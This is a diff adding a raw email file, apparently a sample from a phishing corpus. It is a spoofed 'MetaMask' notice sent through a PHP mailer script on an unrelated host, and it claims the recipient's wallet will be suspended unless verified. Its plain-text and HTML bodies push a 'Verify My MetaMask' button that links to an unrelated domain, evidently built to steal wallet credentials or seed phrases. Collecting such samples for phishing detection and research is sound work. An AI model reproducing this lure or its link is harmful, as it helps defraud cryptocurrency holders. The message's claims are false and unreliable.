@@ -1,0 +1,135 @@
+Return-Path: Mtcpink@yyym.com
+Delivered-To: jose@monkey.org
+X-FDA: 80605744380.13.3D68191
+Received: from mail.rapidinfrastruktur.com (mail.rapidinfrastruktur.com [13.251.58.107])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 24543120006
+	for <jose@monkey.org>; Sat, 25 Mar 2023 01:51:47 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;
+	dkim=pass header.d=rapidinfrastruktur.com header.s=default header.b=FuSryb8Y;
+	dmarc=none;
+	spf=none (imf16.b.hostedemail.com: domain of Mtcpink@yyym.com has no SPF policy when checking 13.251.58.107) smtp.mailfrom=Mtcpink@yyym.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1679709108;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=klXXCQtCEt1+jCkWtPWweOtxvyOpPTln7t/zhzpLArI=;
+	b=I3pNg8QUIAuTa229obu90jLvz0pjpEB0S8LtKGI2ulXQWaa1wbtaAGj8xOJ7sDfp5BM79J
+	IBd9wsuiIBSM8FqxYCQcZLYc5bit8ajIRGn/tNGh9SVswF0HR5wzHmZ9mSSgGYQ2pt1ANS
+	vgNcLfLFmtVKYMJnmnvcGsxjPyH738Y=
+ARC-Authentication-Results: i=1;
+	imf16.b.hostedemail.com;
+	dkim=pass header.d=rapidinfrastruktur.com header.s=default header.b=FuSryb8Y;
+	dmarc=none;
+	spf=none (imf16.b.hostedemail.com: domain of Mtcpink@yyym.com has no SPF policy when checking 13.251.58.107) smtp.mailfrom=Mtcpink@yyym.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1679709108; a=rsa-sha256;
+	cv=none;
+	b=h6Jfr/NUUC4fhe30aF2k46MAUZC4Cy0Dsuz6OOKQTeQWH7Hmfvm5FJHQeDMrrZoU0hMtZU
+	/JvKD0HBYMyLsgewTEslCW1JX3KeuI72r/ximgDyaitJes1XcDCseVBi1k+03cJzvHClUj
+	1+N94EHrL7TGFC2zZngQFlYi+LTRh8o=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=rapidinfrastruktur.com; s=default; h=Content-Transfer-Encoding:Content-Type
+	:MIME-Version:Message-ID:From:Date:Subject:To:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=klXXCQtCEt1+jCkWtPWweOtxvyOpPTln7t/zhzpLArI=; b=FuSryb8Ytz5ShIQnw9OkUH3Cw8
+	pLe2LRm59fxP6DCvmJQNvlGos8WUz+eLTzzJQrvzQRnpxMmFCFhfLDq4vrtBA/8lx9VNv8bDYWCRv
+	lY8orYk6fBugIMZK/rZjbIayhvUTAvmYxu8Z2Z1DysXPRARzSfyTpjJrj/p7nX7STTQdMz1PoIKF+
+	eAotHHxRlym0FDq80IGzWFLwd3/FY4Mx8/SHGTAFE6O2+rdAkHaDwVUVwtygv9ls4dtInHvks3PO4
+	XCcmKqoZECH2YVhdXfZt/LXBtftNTcav5pRz+Lx8q4mfn7i8lPqmxgCHFdjFIIKODnhR9nQiXKqmG
+	3J7mtFAA==;
+Received: from rape6953 by host.rapidinfrastruktur.com with local (Exim 4.96)
+	(envelope-from <Mtcpink@yyym.com>)
+	id 1pfTyf-00030m-0W
+	for jose@monkey.org;
+	Fri, 24 Mar 2023 06:04:13 +0700
+To: jose@monkey.org
+Subject: Yourwallet
+X-PHP-Script: rapidinfrastruktur.com/leaf1.php for 23.146.240.31
+X-PHP-Originating-Script: 1004:leaf1.php
+Date: Thu, 23 Mar 2023 23:04:13 +0000
+From: MetaMask <Mtcpink@yyym.com>
+Message-ID: <aa2369b5e0202a4429a4ccb8e690881c@rapidinfrastruktur.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="b1_aa2369b5e0202a4429a4ccb8e690881c"
+Content-Transfer-Encoding: 8bit
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - host.rapidinfrastruktur.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [1004 993] / [47 12]
+X-AntiAbuse: Sender Address Domain - yyym.com
+X-Get-Message-Sender-Via: host.rapidinfrastruktur.com: authenticated_id: rape6953/only user confirmed/virtual account not confirmed
+X-Authenticated-Sender: host.rapidinfrastruktur.com: rape6953
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 24543120006
+X-Rspam-User: 
+X-Stat-Signature: 36n83zfjx41os9kw8tzig181o1dn96a8
+X-Spam-Status: No, score=5.80
+X-HE-Tag: 1679709107-629686
+X-HE-Meta: U2FsdGVkX1+zRO/kcwpSW4zisHQdmsLCBBCn+kanS4eMG2SkDAG4m1Rf5CuUcQ6eWpks+HpF0aVpqG6eh/6B2BBQMk6ZSm5k8IuJLgC2NAJeKDQMbEUmAdovhuTkkNakf6l1Bnh6mMrvqE3QTppPEWDiq/Aaj0sBiey8ueHdNuvFefyX2A7WX31fDqdRvONsXZiFlzRmukfOcca6v8/u97AC0805DANnQocyISMpl7rwShQkYCR/MsttH/XUPOvb
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 59
+
+This is a multi-part message in MIME format.
+
+--b1_aa2369b5e0202a4429a4ccb8e690881c
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+
+
+
+
+
+
+
+  
+
+
+
+Verify your MetaMask Wallet
+Our system has shown that your MetaMask wallet has not yet been verified, this verification can be done easily via the button below. Unverified accounts will be suspended on:
+Monday, March 27, 2023.
+We are sorry for any inconvenience caused by this, but please note that our intention is to keep our customers safe and happy. Safety is and remains our priority.
+Verify My MetaMask 
+
+
+
+
+--b1_aa2369b5e0202a4429a4ccb8e690881c
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+<html><head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="GENERATOR" content="MSHTML 11.00.10570.1001"></head>
+<body>
+<table style="width: 100%;">
+<tbody><tr>
+<td style="text-align: center; padding-top: 15px; padding-bottom: 15px;" colspan="3"> <img width="151" height="117" align="middle" style="width: 151px; height: 117px;" alt="" src="https://images.ctfassets.net/9sy2a0egs6zh/4zJfzJbG3kTDSk5Wo4RJI1/1b363263141cf629b28155e2625b56c9/mm-logo.svg" border="0" hspace="0"><span class="proton-image-anchor inline-block" style="margin: 32px 0px;" data-proton-remote="remote-0"></span> </td></tr>
+<tr style="font-family: Arial, Helvetica;">
+<td width="25" style="width: 25px;"></td>
+<td style="padding: 15px; color: rgb(22, 28, 45); line-height: 22px; font-size: 15px; background-color: rgb(236, 240, 241);">
+<h1 style="margin: 0px 0px 32px; text-align: center; font-size: 20px;">Verify your MetaMask Wallet</h1>
+<p style="text-align: center; margin-bottom: 12px;">Our system has shown that your MetaMask wallet has not yet been verified, this verification can be done easily via the button below. Unverified accounts will be suspended on:<br><strong>
+Monday, March 27, 2023</strong>.</p>
+<p style="text-align: center; margin-bottom: 12px;">We are sorry for any inconvenience caused by this, but please note that our intention is to keep our customers safe and happy. Safety is and remains our priority.</p>
+<p style="text-align: center; margin-bottom: 12px;"><a style="margin: 12px auto; padding: 10px 14px; border-radius: 5px; text-align: center; color: rgb(255, 255, 255); text-decoration: none; display: inline-block; background-color: rgb(51, 117, 187);" href="https://aobelomenow.work.gd/" target="_blank" rel="noreferrer nofollow noopener">Verify My MetaMask</a> </p>
+<hr style="background: rgb(221, 221, 221); width: 100%; margin-top: 32px; min-height: 1px;">
+</td>
+<td width="25" style="width: 25px;"></td></tr></tbody></table><font face="Arial, Helvetica, sans-serif" size="2"></font></body></html>
+
+
+
+--b1_aa2369b5e0202a4429a4ccb8e690881c--
+
+
